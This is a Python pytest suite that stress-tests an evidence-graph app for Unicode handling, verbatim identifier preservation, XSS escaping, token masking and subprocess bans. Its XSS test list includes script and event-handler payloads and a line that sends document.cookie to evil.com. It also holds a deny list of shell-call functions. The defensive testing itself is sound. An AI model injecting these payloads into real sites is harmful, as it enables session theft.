# -*- coding: utf-8 -*-
"""Adversarial Challenge Test Suite for AIOS_habbit Commit D.

Authored by Challenger 2 to rigorously probe:
1. Unicode Torture Testing:
   - Vietnamese combining diacritics in NFC and NFD forms, tone marks (hợp đồng, chuỗi, trích dẫn, kiểm kê, phân đoạn).
   - Japanese rare Kanji ('𠮷' U+20BB7 outside BMP, '竈' U+7AC8, '鬱' U+9B31) and half-width Katakana ('ｶﾀｶﾅ', 'ﾃｽﾄ', 'ﾊﾝﾃﾞｨﾀｰﾐﾅﾙ').
   - Simplified Chinese rare/special characters ('䶮' U+4DAE, '赟' U+8D5F, '堃' U+5803, '淼' U+6DFc).
   - JSON serialization/deserialization integrity with ensure_ascii=False and zero raw '\\uXXXX' mojibake.
2. Verbatim Preservation:
   - Technical error codes ('ERR_KHO_SYNC_0x80040111', 'ERR_GRAPHIFY_AST_PARSE_0x80004005', 'WS_TIMEOUT_EVD_99').
   - Complex multilingual filenames ('Báo_cáo_tài_chính_và_kho_vận_Q3_2026.xlsx', '𠮷野家_inventory_2026.pdf', '仓储操作规范_2026.docx').
   - Citation identifiers ('[1]', '[E1]', '[E12]', '[CIT-99]', 'EVD-001', '[𠮷1]').
3. Security & Sanitization:
   - XSS script injection payloads (<script>, <img onerror>, <svg onload>, javascript: links, template tags).
   - Dynamic HTML and SVG escaping via html.escape() across all node and edge fields.
   - Sensitive token masking ('sk-...', 'Bearer ...', 'ant-api03-...', 'AIzaSy...') and local path masking ('<path>').
4. VPS Isolation & Single-Tenant Contract:
   - Storage isolation strictly under 'local_cases/workspace_chat/' and .gitignore compliance.
   - Zero cloud egress (no external network sockets, no CDN links).
   - Zero CLI subprocess execution (no subprocess, no shutil.which, no os.system).
"""
from __future__ import annotations

import ast
from concurrent.futures import ThreadPoolExecutor, as_completed
import html
import json
from pathlib import Path
import re
import unicodedata
from unittest.mock import MagicMock, patch
import pytest

from aios_habit.antigravity_bridge import (
    sanitize_bridge_error,
    sanitize_reason,
)
from aios_habit.evidence_graph_viewer import (
    EvidenceGraphViewerCache,
    EvidenceGraphViewModel,
    VIEWER_CACHE,
    _coerce_to_trace,
    _esc,
    build_evidence_graph_view_model,
    compute_trace_content_hash,
    render_evidence_graph_html,
    render_evidence_graph_streamlit,
)
from aios_habit.evidence_trace import (
    build_evidence_trace_from_citations,
    create_evidence_trace,
    is_insufficient_evidence,
)
from aios_habit.evidence_trace_schema import (
    ALLOWED_EDGE_TYPES,
    ALLOWED_NODE_TYPES,
    SCHEMA_VERSION_V1,
    EvidenceEdge,
    EvidenceNode,
    EvidenceTrace,
)
from aios_habit.excaliflow_adapter import (
    CJK_MONOSPACE_FONT_STACK,
    CJK_MULTI_LOCALE_FONT_STACK,
    CapabilityStatus,
    ExcaliFlowAdapter,
    ExcaliFlowCapabilities,
)
from aios_habit.graphify_adapter import (
    GraphifyAdapter,
    GraphifyCapabilities,
)
from aios_habit.i18n import (
    DEFAULT_LOCALE,
    SUPPORTED_LOCALES,
    TRANSLATIONS,
    get_ai_language_instruction,
    normalize_locale,
    t,
)
import aios_habit.workspace_chat_store as chat_store
from aios_habit.workspace_chat_store import (
    LOCAL_CHAT_DIR,
    TRACES_FILE,
    WorkspaceChatStore,
    load_evidence_trace,
    save_evidence_trace,
)
import uuid

REPO_ROOT = Path(__file__).resolve().parent.parent


def _make_sample_trace(
    query: str = "Query",
    answer_text: str = "Answer",
    citations: Optional[List[Dict[str, Any]]] = None,
    sources: Optional[List[Dict[str, Any]]] = None,
    ui_locale: str = DEFAULT_LOCALE,
    answer_language: str = DEFAULT_LOCALE,
    trace_id: Optional[str] = None,
    metadata: Optional[Dict[str, Any]] = None,
) -> EvidenceTrace:
    t_id = trace_id or f"trc_sample_{uuid.uuid4().hex[:8]}"
    nodes: List[EvidenceNode] = [
        EvidenceNode(id=f"q_{t_id}", node_type="question", title=query, snippet=query),
        EvidenceNode(id=f"a_{t_id}", node_type="answer", title=answer_text, snippet=answer_text),
    ]
    edges: List[EvidenceEdge] = [
        EvidenceEdge(source_id=f"a_{t_id}", target_id=f"q_{t_id}", relation_type="derives_from"),
    ]

    src_map: Dict[str, str] = {}
    if sources:
        for s in sources:
            s_id = str(s.get("source_id", "s1"))
            s_title = str(s.get("title", s_id))
            nodes.append(EvidenceNode(
                id=s_id,
                node_type="source",
                title=s_title,
                snippet=s.get("snippet", ""),
                source_id=s.get("source_path", s_id),
            ))
            src_map[s_id] = s_id

    if citations:
        for idx, c in enumerate(citations):
            c_id = str(c.get("citation_id", f"[{idx+1}]"))
            c_node_id = f"cit_{t_id}_{idx}"
            s_id = str(c.get("source_id", "s1"))
            nodes.append(EvidenceNode(
                id=c_node_id,
                node_type="citation",
                title=c_id,
                snippet=c.get("snippet", ""),
                citation_id=c_id,
                source_id=s_id,
            ))
            edges.append(EvidenceEdge(source_id=f"a_{t_id}", target_id=c_node_id, relation_type="cites"))
            if s_id in src_map:
                edges.append(EvidenceEdge(source_id=c_node_id, target_id=s_id, relation_type="extracted_from"))

    return EvidenceTrace(
        trace_id=t_id,
        query=query,
        answer_text=answer_text,
        ui_locale=ui_locale,
        answer_language=answer_language,
        nodes=nodes,
        edges=edges,
        metadata=metadata or {"status": "valid", "insufficient_evidence": False},
    )


# ==============================================================================
# 1. UNICODE TORTURE TESTING (NFC/NFD, Rare Kanji, Half-width Kana, Rare Hanzi)
# ==============================================================================

class TestAdversarialUnicodeTorture:
    """Rigorous Unicode torture test suite."""

    VIETNAMESE_NFC_SAMPLES = [
        "Tiếng Việt có dấu: ắ ằ ẳ ẵ ặ, ế ề ể ễ ệ, ố ồ ổ ỗ ộ, ứ ừ ử ữ ự, ý ỳ ỷ ỹ ỵ, đ Đ.",
        "Hợp đồng kinh tế và biên bản nghiệm thu phân đoạn dữ liệu kho vận số 08/2026/HĐKT.",
        "Trích dẫn bằng chứng xác minh chuỗi cung ứng và hàng tồn kho.",
    ]

    JAPANESE_RARE_SAMPLES = [
        "𠮷野家 (Tsuchiyoshi U+20BB7 - 4 bytes UTF-8 surrogate pair in UTF-16)",
        "竈門炭治郎 (Kamado U+7AC8)",
        "鬱病・憂鬱 (Utsu U+9B31 - 29 strokes)",
        "ﾊﾝﾃﾞｨﾀｰﾐﾅﾙでの在庫同期ｴﾗｰ (Half-width Katakana: ﾊ ﾝ ﾃﾞ ｨ ﾀ ｰ ﾐ ﾅ ﾙ)",
    ]

    CHINESE_RARE_SAMPLES = [
        "䶮 (Yǎn U+4DAE - CJK Unified Ideographs Extension A)",
        "赟 (Yūn U+8D5F - Rare surname character)",
        "堃 (Kūn U+5803 - Rare name character)",
        "淼 (Miǎo U+6DFC - Triplicated water character)",
        "仓储系统库存异常同步与排查指引 (Simplified Chinese standard)",
    ]

    def test_vietnamese_nfc_and_nfd_equivalence_and_handling(self) -> None:
        """Verify handling of both NFC (precomposed) and NFD (decomposed) Vietnamese strings."""
        for sample_nfc in self.VIETNAMESE_NFC_SAMPLES:
            sample_nfd = unicodedata.normalize("NFD", sample_nfc)
            assert sample_nfc != sample_nfd, "NFD representation must differ in code units from NFC"

            # Test trace creation with NFD string
            trace_nfd = _make_sample_trace(
                query=sample_nfd,
                answer_text=f"Trả lời: {sample_nfd} [1]",
                citations=[{"citation_id": "[1]", "snippet": sample_nfd, "source_path": "doc_nfd.pdf", "source_id": "s1"}],
                sources=[{"source_id": "s1", "title": "doc_nfd.pdf", "source_path": "doc_nfd.pdf"}],
                ui_locale="vi",
            )

            # Serialization to dict and JSON round-trip
            json_str = json.dumps(trace_nfd.to_dict(), ensure_ascii=False)
            assert "\\u" not in json_str, "ensure_ascii=False must not output raw \\uXXXX sequences"
            restored_dict = json.loads(json_str)
            restored_trace = EvidenceTrace.from_dict(restored_dict)

            assert restored_trace.query == sample_nfd
            assert any(n.snippet == sample_nfd for n in restored_trace.nodes)

            # Content hash must compute cleanly
            hash_val = compute_trace_content_hash(trace_nfd)
            assert isinstance(hash_val, str) and len(hash_val) == 64

            # HTML Rendering
            html_out = render_evidence_graph_html(trace_nfd, locale="vi")
            assert "doc_nfd.pdf" in html_out
            assert len(html_out) > 0

    def test_japanese_rare_kanji_astral_plane_and_half_width_katakana(self) -> None:
        """Verify Japanese rare Kanji outside BMP ('𠮷' U+20BB7) and half-width Katakana."""
        for sample in self.JAPANESE_RARE_SAMPLES:
            trace = _make_sample_trace(
                query=f"検索: {sample}",
                answer_text=f"回答: {sample} [𠮷1]",
                citations=[{"citation_id": "[𠮷1]", "snippet": sample, "source_path": f"{sample[:10]}.pdf", "source_id": "s1"}],
                sources=[{"source_id": "s1", "title": f"{sample[:10]}.pdf", "source_path": f"{sample[:10]}.pdf"}],
                ui_locale="ja",
                answer_language="ja",
            )

            # Check hashing
            hash_val = compute_trace_content_hash(trace)
            assert isinstance(hash_val, str) and len(hash_val) == 64

            # Check view model
            vm = build_evidence_graph_view_model(trace, locale="ja")
            assert vm.is_insufficient is False
            assert len(vm.nodes) >= 3

            # Check HTML rendering
            html_out = render_evidence_graph_html(trace, locale="ja")
            assert "[𠮷1]" in html_out
            assert "根拠グラフ" in html_out
            assert "\\u" not in html_out

            # Check ExcaliFlow SVG and HTML adapters
            adapter = ExcaliFlowAdapter()
            svg_out = adapter.render_trace_svg(trace, locale="ja")
            assert "<svg" in svg_out
            assert "[𠮷1]" in svg_out

            scene = adapter.export_excalidraw_scene(trace, locale="ja")
            assert scene["type"] == "excalidraw"

    def test_chinese_rare_hanzi_and_simplified_chinese_fidelity(self) -> None:
        """Verify Simplified Chinese rare characters ('䶮', '赟', '堃', '淼')."""
        combined_chinese = " ".join(self.CHINESE_RARE_SAMPLES)
        trace = _make_sample_trace(
            query=f"查询: {combined_chinese}",
            answer_text=f"结果: {combined_chinese} [E1]",
            citations=[{"citation_id": "[E1]", "snippet": combined_chinese, "source_path": "仓储_䶮_2026.docx", "source_id": "s1"}],
            sources=[{"source_id": "s1", "title": "仓储_䶮_2026.docx", "source_path": "仓储_䶮_2026.docx"}],
            ui_locale="zh-CN",
            answer_language="zh-CN",
        )

        hash_val = compute_trace_content_hash(trace)
        assert len(hash_val) == 64

        html_out = render_evidence_graph_html(trace, locale="zh-CN")
        assert "䶮" in html_out
        assert "赟" in html_out
        assert "堃" in html_out
        assert "淼" in html_out
        assert "仓储_䶮_2026.docx" in html_out
        assert "证据图谱" in html_out

    def test_i18n_translation_lookup_with_unicode_torture_kwargs(self) -> None:
        """Verify t() string formatting preserves complex Unicode kwargs without error."""
        torture_val = "𠮷野家 · 䶮 · ắ ằ ẳ ẵ ặ"
        formatted = t("managing_sources_expander", locale="vi", total=torture_val, enabled=1)
        assert torture_val in formatted
        assert "1" in formatted


# ==============================================================================
# 2. VERBATIM PRESERVATION TESTING
# ==============================================================================

class TestAdversarialVerbatimPreservation:
    """Verify 100% exact verbatim preservation of critical identifiers."""

    TECHNICAL_ERROR_CODES = [
        "ERR_KHO_SYNC_0x80040111",
        "ERR_GRAPHIFY_AST_PARSE_0x80004005",
        "WS_TIMEOUT_EVD_99",
        "ORA-01403_NO_DATA_FOUND",
        "STATUS_500_INTERNAL_SERVER_ERROR_0xDEADBEEF",
    ]

    CITATION_IDENTIFIERS = [
        "[1]",
        "[2]",
        "[E1]",
        "[E12]",
        "[CIT-01]",
        "[CIT-99]",
        "EVD-001",
        "EVD-999_FINAL",
        "[𠮷1]",
    ]

    COMPLEX_FILENAMES = [
        "Báo_cáo_tài_chính_và_kho_vận_Q3_2026.xlsx",
        "Quy_trình_kiểm_kê_kho_hàng_v3.docx",
        "在庫管理マニュアル_v2.0.pdf",
        "仓储操作规范_2026.docx",
        "𠮷野家_inventory_2026.pdf",
        "sys_log_2026-08-23_T10-36-17Z.log",
        "src/aios_habit/graphify_adapter.py",
    ]

    def test_verbatim_technical_error_codes_across_all_renderers(self) -> None:
        """Verify technical error codes remain unmodified in HTML, SVG, and Excalidraw scene."""
        for err_code in self.TECHNICAL_ERROR_CODES:
            trace = _make_sample_trace(
                query=f"Lỗi {err_code}",
                answer_text=f"Gặp mã lỗi {err_code} khi đồng bộ [1].",
                citations=[{"citation_id": "[1]", "snippet": f"Exception raised: {err_code}", "source_path": "error.log", "source_id": "s1"}],
                sources=[{"source_id": "s1", "title": "error.log", "source_path": "error.log"}],
                ui_locale="vi",
            )

            # HTML renderer
            html_out = render_evidence_graph_html(trace, locale="vi")
            assert err_code in html_out, f"Error code {err_code} was altered in HTML output!"

            # ExcaliFlow Adapter HTML
            adapter = ExcaliFlowAdapter()
            adapter_html = adapter.render_trace_html(trace, locale="vi")
            assert err_code in adapter_html

            # ExcaliFlow Adapter SVG
            svg_out = adapter.render_trace_svg(trace, locale="vi")
            assert err_code in svg_out

    def test_verbatim_citation_identifiers_in_badges_and_edges(self) -> None:
        """Verify citation identifiers are preserved 100% verbatim in view model and HTML badges."""
        for cid in self.CITATION_IDENTIFIERS:
            trace = _make_sample_trace(
                query="Query",
                answer_text=f"Answer mentioning {cid}",
                citations=[{"citation_id": cid, "snippet": f"Excerpt for {cid}", "source_path": "ref.pdf", "source_id": "s1"}],
                sources=[{"source_id": "s1", "title": "ref.pdf", "source_path": "ref.pdf"}],
                ui_locale="vi",
            )

            vm = build_evidence_graph_view_model(trace, locale="vi")
            citation_nodes = [n for n in vm.nodes if n["node_type"] == "citation"]
            assert len(citation_nodes) == 1
            assert citation_nodes[0]["citation_id"] == cid

            html_out = render_evidence_graph_html(trace, locale="vi")
            assert _esc(cid) in html_out

    def test_verbatim_complex_filenames_in_source_cards(self) -> None:
        """Verify complex filenames with unicode and symbols are preserved without modification."""
        for fname in self.COMPLEX_FILENAMES:
            trace = _make_sample_trace(
                query="Query",
                answer_text="Answer [1]",
                citations=[{"citation_id": "[1]", "snippet": "Snippet", "source_path": fname, "source_id": "s1"}],
                sources=[{"source_id": "s1", "title": fname, "source_path": fname}],
                ui_locale="vi",
            )

            html_out = render_evidence_graph_html(trace, locale="vi")
            assert _esc(fname) in html_out

    def test_get_ai_language_instruction_preservation_mandates(self) -> None:
        """Verify get_ai_language_instruction contains explicit verbatim mandates for vi, ja, zh-CN."""
        inst_vi = get_ai_language_instruction("vi")
        assert "Giữ nguyên vẹn 100%" in inst_vi
        assert "mã trích dẫn" in inst_vi
        assert "tên tệp" in inst_vi
        assert "mã lỗi kỹ thuật" in inst_vi

        inst_ja = get_ai_language_instruction("ja")
        assert "100%保持してください" in inst_ja
        assert "引用ID" in inst_ja
        assert "ファイル名" in inst_ja
        assert "エラーコード" in inst_ja

        inst_zh = get_ai_language_instruction("zh-CN")
        assert "100%完整保留" in inst_zh
        assert "引用ID" in inst_zh
        assert "文件名" in inst_zh
        assert "技术错误代码" in inst_zh


# ==============================================================================
# 3. SECURITY & SANITIZATION TESTING (XSS & Sensitive Token Masking)
# ==============================================================================

class TestAdversarialSecurityAndSanitization:
    """Security verification: XSS prevention, HTML escaping, and sensitive token masking."""

    XSS_ATTACK_PAYLOADS = [
        '<script>alert("XSS_ALERT_1")</script>',
        '<img src="x" onerror="alert(\'XSS_IMG\')">',
        '<svg onload="alert(\'XSS_SVG\')">',
        '<a href="javascript:alert(\'XSS_LINK\')">Click</a>',
        '<iframe src="javascript:alert(\'XSS_IFRAME\')"></iframe>',
        '"><script>document.location="http://evil.com/?c="+document.cookie</script>',
        "{{ 7 * 7 }}",
        "<style>body{background:red;}</style>",
        '<input type="text" autofocus onfocus="alert(1)">',
    ]

    def test_xss_payloads_in_all_node_fields_neutralized_in_html(self) -> None:
        """Inject malicious XSS payloads into query, answer, title, snippet, source_id, and citation_id."""
        for payload in self.XSS_ATTACK_PAYLOADS:
            trace = _make_sample_trace(
                query=f"Query with XSS: {payload}",
                answer_text=f"Answer with XSS: {payload} [1]",
                citations=[{"citation_id": payload, "snippet": payload, "source_path": payload, "source_id": payload}],
                sources=[{"source_id": payload, "title": payload, "source_path": payload}],
                ui_locale="vi",
            )

            html_out = render_evidence_graph_html(trace, locale="vi", use_cache=False)

            # Raw unescaped dangerous tags must NEVER appear in the HTML string
            assert "<script>" not in html_out
            assert "</script>" not in html_out
            assert 'onerror="alert' not in html_out
            assert 'onload="alert' not in html_out
            assert 'href="javascript:' not in html_out
            assert "<iframe>" not in html_out
            assert "<style>body" not in html_out

            # Escaped representations must be present safely
            escaped_payload = html.escape(payload, quote=True)
            assert escaped_payload in html_out or html.escape(payload) in html_out

    def test_xss_payloads_neutralized_in_svg_renderer(self) -> None:
        """Verify ExcaliFlowAdapter SVG renderer escapes all text nodes."""
        adapter = ExcaliFlowAdapter()
        for payload in self.XSS_ATTACK_PAYLOADS:
            trace = _make_sample_trace(
                query="Query",
                answer_text="Answer [1]",
                citations=[{"citation_id": "[1]", "snippet": payload, "source_path": "test.txt", "source_id": "s1"}],
                sources=[{"source_id": "s1", "title": payload, "source_path": "test.txt"}],
                ui_locale="vi",
            )
            svg_out = adapter.render_trace_svg(trace, locale="vi")
            assert "<script>" not in svg_out
            assert "</script>" not in svg_out
            assert "<img" not in svg_out
            assert "<iframe>" not in svg_out

    def test_sensitive_token_masking_in_bridge_error_sanitizer(self) -> None:
        """Verify API keys and sensitive tokens are masked as <redacted_token>."""
        test_cases = [
            ("Failed with token sk-proj-1234567890abcdef1234567890abcdef", "<redacted_token>"),
            ("Auth error: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9", "<redacted_token>"),
            ("Invalid token ant-api03-abcdef1234567890", "<redacted_token>"),
            ("Quota exceeded for AIzaSyAbCdEf1234567890", "<redacted_token>"),
        ]
        for raw_input, expected_masked in test_cases:
            sanitized = sanitize_reason(raw_input)
            assert expected_masked in sanitized
            # Ensure raw secret is not in sanitized text
            if "sk-proj-" in raw_input:
                assert "sk-proj-" not in sanitized

    def test_local_path_masking_in_bridge_error_sanitizer(self) -> None:
        """Verify local absolute Windows and POSIX paths are masked as <path>."""
        test_cases = [
            ("File error: D:\\Sandbox\\AIOS_habbit\\local_cases\\workspace_chat\\traces.jsonl", "<path>"),
            ("Read failure at /var/aios/local_cases/secret.key line 10", "<path>"),
            ("Cannot open C:/Users/Admin/AppData/Local/AIOS/config.json", "<path>"),
        ]
        for raw_input, expected_masked in test_cases:
            sanitized = sanitize_bridge_error(raw_input)
            assert expected_masked in sanitized
            assert "D:\\Sandbox" not in sanitized
            assert "/var/aios" not in sanitized
            assert "C:/Users/Admin" not in sanitized


# ==============================================================================
# 4. VPS ISOLATION, DATA BOUNDARIES & AST ZERO-PATH GUARANTEE
# ==============================================================================

class TestAdversarialVPSIsolationAndDataBoundaries:
    """Verify single-tenant storage boundaries, .gitignore compliance, and zero external CLI calls."""

    def test_gitignore_contains_local_cases_and_graphify_out(self) -> None:
        """Verify .gitignore rules explicitly isolate local_cases/ and graphify-out/."""
        gitignore_path = REPO_ROOT / ".gitignore"
        assert gitignore_path.exists(), ".gitignore must exist"

        content = gitignore_path.read_text(encoding="utf-8")
        assert "local_cases/" in content
        assert "graphify-out/" in content
        assert ".env" in content

    def test_chat_store_isolated_directory_structure(self, tmp_path: Path) -> None:
        """Verify multiple independent workspace store instances do not collide or leak data."""
        store_1 = WorkspaceChatStore(base_dir=tmp_path / "tenant_1" / "local_cases" / "workspace_chat")
        store_2 = WorkspaceChatStore(base_dir=tmp_path / "tenant_2" / "local_cases" / "workspace_chat")

        trace_1 = _make_sample_trace(
            query="Tenant 1 Secret Query",
            answer_text="Tenant 1 Secret Answer [1]",
            citations=[{"citation_id": "[1]", "snippet": "Tenant 1 Confidential", "source_path": "t1.pdf", "source_id": "s1"}],
            sources=[{"source_id": "s1", "title": "t1.pdf", "source_path": "t1.pdf"}],
        )

        store_1.save_trace(trace_1)

        # Store 1 has the trace
        assert store_1.get_trace(trace_1.trace_id) is not None

        # Store 2 CANNOT see the trace
        assert store_2.get_trace(trace_1.trace_id) is None

    def test_ast_zero_subprocess_or_path_search_in_all_commit_d_modules(self) -> None:
        """Static AST verification: NO subprocess, os.system, os.popen, shutil.which in any adapter."""
        adapter_files = [
            REPO_ROOT / "src" / "aios_habit" / "graphify_adapter.py",
            REPO_ROOT / "src" / "aios_habit" / "excaliflow_adapter.py",
            REPO_ROOT / "src" / "aios_habit" / "evidence_graph_viewer.py",
        ]

        prohibited_modules = {"subprocess"}
        prohibited_functions = {"popen", "system", "spawn", "which"}

        for fpath in adapter_files:
            if not fpath.exists():
                continue
            tree = ast.parse(fpath.read_text(encoding="utf-8"), filename=str(fpath))
            for node in ast.walk(tree):
                if isinstance(node, ast.Import):
                    for alias in node.names:
                        assert alias.name not in prohibited_modules, (
                            f"Prohibited import '{alias.name}' in {fpath.name}:{node.lineno}"
                        )
                elif isinstance(node, ast.ImportFrom):
                    if node.module:
                        assert node.module not in prohibited_modules, (
                            f"Prohibited from-import '{node.module}' in {fpath.name}:{node.lineno}"
                        )
                elif isinstance(node, ast.Call):
                    func_name = ""
                    if isinstance(node.func, ast.Attribute):
                        func_name = node.func.attr.lower()
                    elif isinstance(node.func, ast.Name):
                        func_name = node.func.id.lower()
                    assert func_name not in prohibited_functions, (
                        f"Prohibited function call '{func_name}' in {fpath.name}:{node.lineno}"
                    )
